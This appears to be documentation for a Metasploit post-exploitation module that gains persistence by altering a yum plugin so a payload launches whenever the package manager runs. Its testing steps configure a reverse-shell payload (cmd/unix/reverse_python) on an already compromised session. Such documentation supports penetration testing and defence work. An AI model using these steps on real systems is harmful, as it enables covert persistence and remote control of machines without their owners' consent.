## Yum package manager persistence

This module will run a payload when the package manager is used. No
handler is ran automatically so you must configure an appropriate
exploit/multi/handler to connect. Module modifies a yum plugin to
launch a binary of choice. grep -F 'enabled=1' /etc/yum/pluginconf.d/
will show what plugins are currently enabled on the system.

### Testing

1. Exploit a box that uses Yum 
2. `use linux/local/yum_package_manager_persistence`
3. `set SESSION <id>`
4. `set PAYLOAD cmd/unix/reverse_python` configure the payload as needed
5. `exploit`

When the system runs yum update the payload will launch.  You must set handler accordingly.
